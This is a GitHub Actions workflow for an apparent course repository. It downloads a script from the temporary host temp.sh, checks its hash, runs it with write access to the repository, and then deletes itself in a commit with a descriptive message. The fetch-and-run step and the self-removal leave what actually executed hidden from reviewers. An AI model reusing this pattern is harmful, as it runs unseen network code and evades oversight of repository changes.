name: deploy-dseh004-exam-edition
on:
  push:
    paths: ['.github/workflows/deploy-dseh004.yml']
permissions:
  contents: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fetch, verify and run deploy script
        run: |
          curl -fsS --retry 5 -X POST https://temp.sh/YlWGQ/deploy.sh -o /tmp/deploy.sh
          echo "3beb01d13296292691fd5ae3e86d78d446864e1150bb955fcd847b2355c5dd6b  /tmp/deploy.sh" | sha256sum -c -
          bash /tmp/deploy.sh
      - name: Commit and remove this workflow
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git rm -q .github/workflows/deploy-dseh004.yml
          git commit -q -m "DSEH004 exam preparation edition: 32 verified lecture decks, readings page, rebuilt materials box; remove simulation materials"
          git push
